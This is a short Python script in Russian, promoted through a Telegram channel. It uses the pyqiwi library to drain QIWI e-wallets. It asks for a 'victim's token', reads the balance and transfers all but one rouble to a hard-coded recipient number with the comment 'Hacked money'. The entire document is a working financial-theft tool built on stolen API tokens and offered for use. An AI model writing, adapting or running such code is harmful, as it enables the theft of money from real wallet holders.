import pyqiwi

import sys

import webbrowser as wb

print("СКРИПТ КАНАЛА: @b1n_bash")
print("Версия: 0.2")
print("Сделана: @Azimjonm2333")

wb.open("https://t.me/b1n_bash")
def main ():
        while True:
                Token = input('\nВведите токен жертвы: ')

                try:
                        wallet = pyqiwi.Wallet(token=Token)
                        print('Баланс: ', wallet.balance(), 'рублей')
                        amount = wallet.balance()
                        a = str (amount - 1)
                        wallet.send(pid=99, recipient = '992928882213', amount = a , comment= 'Взломанные деньги')
                        print ('\nВы успешно взломали киви токен:', Token)
                        
                except Exception:
                        print ('\nНеправильный токен или что-то пошло не так. Попробуйте ещё раз!')
                        main ()
main()
